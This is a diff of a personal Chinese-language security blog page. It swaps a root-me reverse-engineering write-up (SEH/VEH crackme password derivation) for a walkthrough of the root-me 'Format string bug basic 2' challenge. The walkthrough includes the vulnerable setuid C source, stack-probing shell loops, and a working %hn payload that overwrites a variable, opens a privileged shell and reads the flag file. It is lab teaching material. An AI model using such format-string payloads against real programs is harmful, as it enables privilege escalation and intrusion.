@@ -26,32 +26,21 @@
     var CONFIG = {"hostname":"finsenty54.github.io","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
 
-  <meta name="description" content="PE DotNet - 0 protection使用 NET relector工具或者dnSPYhttps:&#x2F;&#x2F;github.com&#x2F;0xd4d&#x2F;dnSpy&#x2F;releases就可以破解">
+  <meta name="description" content="ELF x86 - Format string bug basic 2 snprintfsnprintf— prints into a string with length checking(https:&#x2F;&#x2F;pubs.opengroup.org&#x2F;onlinepubs&#x2F;009695399&#x2F;functions&#x2F;snprintf.html)snprintf（）函数应与sprintf（）等效，并增加了n参">
 <meta property="og:type" content="article">
-<meta property="og:title" content="root_me_PE_x86_SEHVEH_WP">
-<meta property="og:url" content="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/index.html">
+<meta property="og:title" content="Format string bug basic 2">
+<meta property="og:url" content="http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/index.html">
 <meta property="og:site_name" content="FINSENTY54">
-<meta property="og:description" content="PE DotNet - 0 protection使用 NET relector工具或者dnSPYhttps:&#x2F;&#x2F;github.com&#x2F;0xd4d&#x2F;dnSpy&#x2F;releases就可以破解">
+<meta property="og:description" content="ELF x86 - Format string bug basic 2 snprintfsnprintf— prints into a string with length checking(https:&#x2F;&#x2F;pubs.opengroup.org&#x2F;onlinepubs&#x2F;009695399&#x2F;functions&#x2F;snprintf.html)snprintf（）函数应与sprintf（）等效，并增加了n参">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hllIe.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0h09pV.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg">
-<meta property="article:published_time" content="2020-10-13T11:02:38.000Z">
-<meta property="article:modified_time" content="2020-10-31T08:53:12.112Z">
+<meta property="article:published_time" content="2020-11-29T12:25:46.000Z">
+<meta property="article:modified_time" content="2020-11-29T12:27:24.205Z">
 <meta property="article:author" content="finsenty54">
-<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="APP system in root_me">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg">
 
 
-<link rel="canonical" href="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/">
+<link rel="canonical" href="http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/">
 
 
 <script class="page-configurations">
@@ -64,7 +53,7 @@
   };
 </script>
 
-  <title>root_me_PE_x86_SEHVEH_WP | FINSENTY54</title>
+  <title>Format string bug basic 2 | FINSENTY54</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
     <script>
@@ -240,7 +229,7 @@
 
       <!--noindex-->
       <section class="post-toc-wrap sidebar-panel">
-          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PE-DotNet-0-protection"><span class="nav-number">1.</span> <span class="nav-text">PE DotNet - 0 protection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ELF-x64-Crackme-automating"><span class="nav-number">2.</span> <span class="nav-text">ELF x64 - Crackme automating</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PE-x86-SEHVEH-WP"><span class="nav-number">3.</span> <span class="nav-text">PE x86 - SEHVEH_WP</span></a></li></ol></div>
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF-x86-Format-string-bug-basic-2"><span class="nav-number">1.</span> <span class="nav-text">ELF x86 - Format string bug basic 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#snprintf"><span class="nav-number">1.1.</span> <span class="nav-text">snprintf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#format"><span class="nav-number">1.2.</span> <span class="nav-text">format</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%85n"><span class="nav-number">1.3.</span> <span class="nav-text">％n $</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#n"><span class="nav-number">1.4.</span> <span class="nav-text">%n</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.5.</span> <span class="nav-text">源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#try"><span class="nav-number">1.6.</span> <span class="nav-text">try</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hn"><span class="nav-number">1.7.</span> <span class="nav-text">%hn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#final"><span class="nav-number">1.8.</span> <span class="nav-text">final</span></a></li></ol></li></ol></div>
       </section>
       <!--/noindex-->
 
@@ -319,7 +308,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/">
+    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
@@ -335,7 +324,7 @@
     
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          root_me_PE_x86_SEHVEH_WP
+          Format string bug basic 2
         </h1>
 
         <div class="post-meta-container">
@@ -345,19 +334,13 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2020-10-13 19:02:38" itemprop="dateCreated datePublished" datetime="2020-10-13T19:02:38+08:00">2020-10-13</time>
+      <time title="创建时间：2020-11-29 20:25:46 / 修改时间：20:27:24" itemprop="dateCreated datePublished" datetime="2020-11-29T20:25:46+08:00">2020-11-29</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-10-31 16:53:12" itemprop="dateModified" datetime="2020-10-31T16:53:12+08:00">2020-10-31</time>
-      </span>
 
   
-    <span id="/2020/10/13/root_me_PE_x86_SEHVEH_WP/" class="post-meta-item leancloud_visitors" data-flag-title="root_me_PE_x86_SEHVEH_WP" title="阅读次数">
+    <span id="/2020/11/29/Format_string_bug_basic_2/" class="post-meta-item leancloud_visitors" data-flag-title="Format string bug basic 2" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -372,8 +355,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2020/10/13/root_me_PE_x86_SEHVEH_WP/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/10/13/root_me_PE_x86_SEHVEH_WP/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/11/29/Format_string_bug_basic_2/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/29/Format_string_bug_basic_2/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -385,14 +368,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.9k</span>
+      <span>3.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>3 分钟</span>
     </span>
 </div>
 
@@ -403,73 +386,134 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h3 id="PE-DotNet-0-protection"><a href="#PE-DotNet-0-protection" class="headerlink" title="PE DotNet - 0 protection"></a>PE DotNet - 0 protection</h3><p>使用 <code>NET relector</code>工具<br>或者<code>dnSPY</code><br><a target="_blank" rel="noopener" href="https://github.com/0xd4d/dnSpy/releases">https://github.com/0xd4d/dnSpy/releases</a><br>就可以破解</p>
+        <h2 id="ELF-x86-Format-string-bug-basic-2"><a href="#ELF-x86-Format-string-bug-basic-2" class="headerlink" title="ELF x86 - Format string bug basic 2"></a>ELF x86 - Format string bug basic 2</h2><hr>
+<h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><p><code>snprintf</code>— prints into a <code>string</code> with length checking<br>(<a target="_blank" rel="noopener" href="https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html">https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html</a>)<br>snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。<br>·如果n为零，则不写任何内容，而s可以为空指针。<br>·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。<br><em>也就是增加了限制</em></p>
 <a id="more"></a>
 <hr>
-<h3 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h3><p>python 编程</p>
-<p><code>别人写的代码</code><br><a target="_blank" rel="noopener" href="https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/">https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/</a></p>
-<p>int([x]) -&gt; integer<br>int(x, base=10) -&gt; integer<br>将数字或字符转为整形<br>Convert a number or string to an integer, or return 0 if no arguments are given. </p>
-<pre><code>num=line[addr+1,-1]
-
-byte.append(int (num,16)) //将num变为16进制</code></pre>
-<p>使用<code>pwntools</code> / <code>Capstone</code> /<code>objdump</code> 获得反汇编代码<br>之后进行搜索</p>
+<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p><code>format</code>是一个字符串，以其初始移位状态（如果有）开始和结束。<br>format由零个或多个<code>指令</code>组成：<code>普通字符</code>（简单地<code>复制到输出流</code>中）和<code>转换规范</code>，每个转换规范都将导致获取零个或多个<code>参数</code>。<br>·如果format的参数不足，则结果不确定</p>
 <hr>
-<h3 id="PE-x86-SEHVEH-WP"><a href="#PE-x86-SEHVEH-WP" class="headerlink" title="PE x86 - SEHVEH_WP"></a>PE x86 - SEHVEH_WP</h3><p>从题目知道是关于SEH 和 VEH（VectoredExceptionHandler）的。</p>
-<p><em>OllyDBG 查看seh链 选择 <code>view-seh chain</code></em></p>
+<h3 id="％n"><a href="#％n" class="headerlink" title="％n $"></a>％n $</h3><p>·可以将<code>转换</code>应用于参数列表中格式之后的第n个参数，而不是下一个未使用的参数。<br>·在这种情况下，转换说明符字符％（请参见下文）由序列“％n $”代替，其中n是[1，{NL_ARGMAX}]范围内的十进制整数，给出了参数在参数中的位置。</p>
 <hr>
-<ol>
-<li><p>在输入后进入主要部分。</p>
-<img src="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg" alt="0hMvnK.jpg" border="0" />
-这段不是很懂，根据多次调试后判断，如果输入12个字节，则`0xB814A8`处就可以跳转，使`EBP`为0.
-<img src="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg" alt="0hQv2n.jpg" border="0" />
-为0，即表示密码正确，会输入成功语句。
-</li>
-<li><p>接下来是第一部分密码</p>
-<img src="https://s1.ax1x.com/2020/10/13/0hllIe.jpg" alt="0hllIe.jpg" border="0" />
-`LODS `即将密码头四个字节放入`EAX`中，将`0x5A643059 xor 0x 3628552E `得到第一部分密码，还需反序排列为`weLl`
-</li>
-<li><p>FS：[0] 为TEB结构体中指向第一个SEH结构体地址</p>
-<img src="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg" alt="0h1iOP.jpg" border="0" />
-<img src="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg" alt="0h1fXt.jpg" border="0" />
-即`0xEFFC14`.
-接着，执行`INT 1`指令后，会进入`0xDB1D60`处的第一个SEH函数。
-<img src="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg" alt="0hdwPP.jpg" border="0" />
-SEH函数的第三个参数，即`[ESP+C]`为pContext的地址，pContext保存线程切换时的寄存器信息。在PE 32位下，`+0xB0`为EAX寄存器的值，`0xB81D64`处将`0x48335621`加到`EAX+0xB0`中，保存着输入的第二部分四字节密码。
-`+0xB8`为EIP寄存器的值，通过下面的判断将EIP值加2，结果为`0xB814E4`，即`INT 1`指令的下一条指令地址。
-`XOR EAX,EAX`将EAX置0，表示从发生异常的代码处继续执行。
-<img src="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg" alt="0hwUL4.jpg" border="0" />
-最后计算如下：
-`FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_`
-反序排列为`_d@n`
-</li>
-<li><p><code>0xB814FF</code>处调用<code>AddVectoredExceptionHandler</code>函数，新增一个SEH函数。</p>
-<img src="https://s1.ax1x.com/2020/10/13/0h09pV.jpg" alt="0h09pV.jpg" border="0" />
-以下摘自https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
-`First`
-The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.
-如果不为0，则成为第一个调用的SEH函数，从图中可以看到，`First=1`.
-`Handler`
-A pointer to the handler to be called. For more information, see VectoredHandler.
-从图中看出，函数地址为`0xB81940`，
-`Return value`
-If the function succeeds, the return value is a handle to the exception handler.
-If the function fails, the return value is NULL.
-<img src="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg" alt="0h0zHH.jpg" border="0" />
-该函数将第三部分的四字节密码减去了一个数，之后，又执行第二个SEH函数。`有个疑问是这里将返回值置0，又怎么执行第二个SEH函数。`
-最后计算如下：
-`3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E`
-反序排列为`E!!!`
-</li>
-<li><p>最后三部分密码组合在一起：<code>weLl_d@nE!!!</code></p>
-<img src="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg" alt="0hDnsO.jpg" border="0" />
-密码正确
+<p>For example, <code>printf(&quot;%2$x&quot;, 1, 2, 3)</code> will print<code> 2</code>. In general, we can do <code>printf(&quot;%&lt;some number&gt;$x&quot;)</code> to select an arbitrary argument to printf.</p>
+<hr>
+<h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>n  参数应该是一个指向整数的指针，到目前为止，通过对fprintf（）函数之一的调用，将写入输出的<code>字节数</code></p>
+<hr>
+<p>The <code>number of characters written so far</code> is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</p>
+<hr>
+<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv )</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span> var;</span><br><span class="line">        <span class="keyword">int</span> check  = <span class="number">0x04030201</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span> fmt[<span class="number">128</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (argc &lt;<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>( fmt, <span class="number">0</span>, <span class="keyword">sizeof</span>(fmt) );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check at 0x%x\n&quot;</span>, &amp;check );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;argv[1] = [%s]\n&quot;</span>, argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">snprintf</span>( fmt, <span class="keyword">sizeof</span>(fmt), argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))    </span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way !\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;fmt=[%s]\n&quot;</span>, fmt );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check=0x%x\n&quot;</span>, check );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (check==<span class="number">0xdeadbeef</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude ! You win !\n&quot;</span>);</span><br><span class="line">                setreuid(geteuid(), geteuid());</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Download</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><pre><code>app-systeme-ch14@challenge02:~$ (for i in `seq 1 10`; do ./ch14 &quot;%$i&quot;&#39;$08x&#39;; ech
+o;done)
+check at 0xbffffae8
+argv[1] = [%1$08x]
+fmt=[080485f1]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%2$08x]
+fmt=[00000000]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%3$08x]
+fmt=[00000000]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%4$08x]
+fmt=[000000c2]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%5$08x]
+fmt=[bffffc34]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%6$08x]
+fmt=[b7fe1439]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%7$08x]
+fmt=[f63d4e2e]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%8$08x]
+fmt=[04030201]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%9$08x]
+fmt=[00000000]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%10$08x]
+fmt=[00000000]
+check=0x4030201</code></pre>
+<p>第<code>8</code>处存着<code>check</code></p>
+<hr>
+<pre><code>(for i in `seq 1 12`; do ./format_2 &quot;AAAA%$i&quot;&#39;$08x&#39;;echo;done)
 
 
+check at 0xbffffae8
+argv[1] = [AAAA%8$08x]
+fmt=[AAAA04030201]
+check=0x4030201
 
+check at 0xbffffae8
+argv[1] = [AAAA%9$08x]
+fmt=[AAAA41414141]
+check=0x4030201
 
-</li>
-</ol>
+check at 0xbffffae8
+argv[1] = [ABCD%8$08x]
+fmt=[ABCD04030201]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [ABCD%9$08x]
+fmt=[ABCD44434241]
+check=0x4030201</code></pre>
+<p>输入值在第九处(小端序)<br>check 在第八处</p>
+<hr>
+<h3 id="hn"><a href="#hn" class="headerlink" title="%hn"></a>%hn</h3><p>use <code>%hn</code> to write only 2 bytes at a time.</p>
+<pre><code>%n          一次性写入 4 个字节
+
+%hn         一次性写入 2 个字节
+
+%hhn        一次性写入 1 个字节</code></pre>
+<p>./a.out “$(python -c ‘import sys; sys.stdout.write(“CAAAAAAA<code>%2044x%10$hn</code>%38912x%11$hn”)’)”<br><a target="_blank" rel="noopener" href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></p>
+<p><del>printf (“\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|”);</del></p>
+<p><del>./format_2 $(python2 -c ‘print “\xd8\xfa\xff\xbf%9$08s”‘)</del></p>
+<hr>
+<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$x
+&quot;&#39;)&quot;
+check at 0xbffffae8
+argv[1] = [Øúÿ¿%9$x]
+fmt=[Øúÿ¿bffffad8]
+check=0x4030201
+
+app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$s
+&quot;&#39;)&quot;
+check at 0xbffffae8
+argv[1] = [Øúÿ¿%9$s]
+fmt=[Øúÿ¿Â]
+check=0x4030201</code></pre>
+<hr>
+<p>\xdead=57005<br>\xbeef=48879<br>\xdead-\xbeef=8126<br>第九处写\xbeef 48879-8<br>第十处写\xdead 8126(已经输出了48879)</p>
+<pre><code>app-systeme-ch14@challenge02:~$ ./ch14 $(python -c &#39;print &quot;\xc8\xfa\xff\xbf\xca\
+xfa\xff\xbf%48871x%9$hn&quot;+&quot;%8126x%10$hn&quot;&#39;)
+check at 0xbffffac8
+argv[1] = [Èúÿ¿Êúÿ¿%48871x%9$hn%8126x%10$hn]
+fmt=[Èúÿ¿Êúÿ¿
+                                                    ]
+check=0xdeadbeef
+Yeah dude ! You win !
+app-systeme-ch14-cracked@challenge02:~$ cat .passwd</code></pre>
 
     </div>
 
@@ -487,7 +531,7 @@ If the function fails, the return value is NULL.
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/" title="root_me_PE_x86_SEHVEH_WP">http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/</a>
+      <a href="http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/" title="Format string bug basic 2">http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -515,21 +559,18 @@ If the function fails, the return value is NULL.
   </div>
 
           <div class="post-tags">
-              <a href="/tags/RCE/" rel="tag"># RCE</a>
+              <a href="/tags/APP-system-in-root-me/" rel="tag"># APP system in root_me</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/10/12/schlage%20(beginner)%20__WP/" rel="prev" title="damCTF- rev/schlage (beginner) __WP">
-                  <i class="fa fa-chevron-left"></i> damCTF- rev/schlage (beginner) __WP
+                <a href="/2020/11/29/leetcode-add-two-numbers/" rel="prev" title="leetcode add two numbers">
+                  <i class="fa fa-chevron-left"></i> leetcode add two numbers
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/10/19/%E9%80%86%E5%90%91_root_me_4/" rel="next" title="逆向_root_me_4">
-                  逆向_root_me_4 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -663,7 +704,7 @@ NexT.utils.loadComments('#valine-comments', () => {
   NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
     new Valine(Object.assign({
       el  : '#valine-comments',
-      path: "/2020/10/13/root_me_PE_x86_SEHVEH_WP/",
+      path: "/2020/11/29/Format_string_bug_basic_2/",
     }, {"enable":true,"appId":"3uGsbMNvxiG0LkbyciDSaxmY-MdYXbMMI","appKey":"1dU1y3SudPaV6pdTET96j5M2","placeholder":"欢迎交流讨论...","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
     ));
   }, window.Valine);
